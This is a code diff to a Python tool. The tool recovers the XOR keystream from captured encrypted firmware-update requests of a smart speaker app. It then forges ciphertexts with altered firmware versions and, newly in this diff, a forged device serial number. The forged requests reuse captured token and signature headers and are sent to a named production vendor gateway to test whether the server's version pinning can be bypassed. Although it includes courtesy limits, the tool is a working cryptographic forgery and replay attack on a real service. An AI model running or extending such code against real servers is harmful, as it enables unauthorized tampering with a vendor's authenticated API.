@@ -22,6 +22,14 @@ response is itself an encrypted envelope, an update is inferred from the respons
 length, the no update baseline is small and an update payload with lastPackage is much
 larger. Reading lastPackage.url in the clear is a separate step, see the notes.
 
+The `--sn` option forges the item serial too, same length so the keystream stays
+aligned. The server pins an authoritative version per sn and will not offer an update
+to a device it knows is current. An sn it has never seen has no pinned version, so a
+synthetic sn probes whether the check version then drives the update decision. An error
+on a forged sn confirms the server validates the sn, a `needUpdate:true` on a fake sn
+with a low version would mean the pin is bypassed. Keep the sn clearly synthetic, do
+not impersonate a real device.
+
 This posts to a third party production gateway. Be respectful, it sends one request per
 candidate with a short delay.
 """
@@ -37,6 +45,9 @@ BEGIN_RE = re.compile(r"SCBODY CAPTURE #(\d+) src=(\S+) url=(\S+) .*BEGIN")
 SEG_RE = re.compile(r"SCBODY #(\d+) seg \d+/\d+ (.*)$")
 HDRSNAP_RE = re.compile(r"SCBODY HDRSNAP ([^:]+): (.*)$")
 VERSION_RE = re.compile(rb'"version":"([^"]*)"')
+# The leading quote means this matches the item sn, not "relation_sn":"..." which
+# has an underscore before sn, so the two are never confused.
+SN_RE = re.compile(rb'"sn":"([^"]*)"')
 
 BATCH_PATH = "api/v2/speaker/firmware/upgrade_check/batch"
 
@@ -102,10 +113,13 @@ def pick_request(caps, header_sets, want_ts):
     if chosen is None:
         sys.exit("no batch request matched --ts %s" % want_ts)
 
-    # The plaintext is the nearest preceding json capture carrying firmware_list.
+    # The plaintext is the nearest preceding firmware_list capture. Prefer json-mod,
+    # the body actually encrypted, over the pre-modification json, so the keystream
+    # is recovered against the bytes that were really sent when a spoof was active.
     plain = None
     for c in caps:
-        if c["line"] < chosen["line"] and c["src"] == "json" and "firmware_list" in c["payload"]:
+        if c["line"] < chosen["line"] and c["src"] in ("json", "json-mod") \
+                and "firmware_list" in c["payload"]:
             plain = c
     if plain is None:
         sys.exit("no plaintext firmware_list json capture found before the body")
@@ -133,11 +147,19 @@ def recover(body_b64, plaintext):
     return ts_prefix, ks, pt
 
 
-def forge(ts_prefix, ks, pt, cur_ver, new_ver):
-    if len(new_ver) != len(cur_ver):
+def forge(ts_prefix, ks, pt, subs):
+    """Apply each (needle, repl) substitution to the plaintext, then re-encrypt by
+    XOR with the recovered keystream. Every substitution must be length preserving,
+    since the keystream is only known for the captured body length, so any length
+    change would misalign it. Returns (base64_body, new_plaintext) or None if a
+    substitution would change the length or its needle is absent."""
+    npt = pt
+    for needle, repl in subs:
+        if len(needle) != len(repl) or needle not in npt:
+            return None
+        npt = npt.replace(needle, repl)
+    if len(npt) != len(pt):
         return None
-    npt = pt.replace(b'"version":"%s"' % cur_ver.encode(),
-                     b'"version":"%s"' % new_ver.encode())
     nct = bytes(p ^ k for p, k in zip(npt, ks))
     return base64.b64encode(ts_prefix + nct).decode(), npt
 
@@ -164,6 +186,12 @@ def main():
     ap.add_argument("--versions", default="14.42,14.00,13.00,10.00,01.00",
                     help="comma separated candidate versions, each must be the same length "
                          "as the captured version so the keystream stays aligned")
+    ap.add_argument("--sn", default="",
+                    help="forge the item sn too, applied to every candidate. Must be the same "
+                         "length as the captured sn to keep the keystream aligned. Use a clearly "
+                         "synthetic value, not a real other device, e.g. 0000000000000000, or "
+                         "3949000000000000 to keep the A3949 product prefix the real sn has. A "
+                         "server pinning the version per sn should treat an unseen sn differently")
     ap.add_argument("--host", default="speaker.eufylife.com")
     ap.add_argument("--timeout", type=float, default=15.0)
     ap.add_argument("--delay", type=float, default=0.6, help="seconds between sent requests")
@@ -182,7 +210,19 @@ def main():
 
     m = VERSION_RE.search(pt)
     cur_ver = m.group(1).decode() if m else ""
+    sm = SN_RE.search(pt)
+    cur_sn = sm.group(1).decode() if sm else ""
     url = "https://%s/%s" % (args.host, BATCH_PATH)
+
+    new_sn = args.sn.strip()
+    if new_sn and len(new_sn) != len(cur_sn):
+        sys.exit("--sn must be %d chars to match the captured sn %s, so the keystream stays aligned"
+                 % (len(cur_sn), cur_sn))
+
+    # The item sn substitution, applied to every candidate when --sn is given.
+    sn_sub = []
+    if new_sn and new_sn != cur_sn:
+        sn_sub = [(b'"sn":"%s"' % cur_sn.encode(), b'"sn":"%s"' % new_sn.encode())]
 
     print("=== recovered from %s ===" % args.log)
     print("  batch body capture : #%d" % body_cap["num"])
@@ -191,6 +231,7 @@ def main():
     print("  X-Request-Ts       : %s" % headers.get("X-Request-Ts"))
     print("  token / unique-sign: %s / %s" % (headers.get("token"), headers.get("unique-sign")))
     print("  current version    : %s (candidates must be %d chars)" % (cur_ver, len(cur_ver)))
+    print("  sn                 : %s%s" % (cur_sn, "  ->  %s (forged)" % new_sn if sn_sub else ""))
     print("  url                : %s" % url)
 
     # The captured version is the control, it should report no update.
@@ -198,7 +239,10 @@ def main():
 
     print("\n=== %s ===" % ("sending" if args.send else "dry run, pass --send to POST"))
     for v in candidates:
-        f = forge(ts_prefix, ks, pt, cur_ver, v)
+        subs = list(sn_sub)
+        if v != cur_ver:
+            subs.append((b'"version":"%s"' % cur_ver.encode(), b'"version":"%s"' % v.encode()))
+        f = forge(ts_prefix, ks, pt, subs)
         if f is None:
             print("%8s -> skipped, length != %d" % (v, len(cur_ver)))
             continue
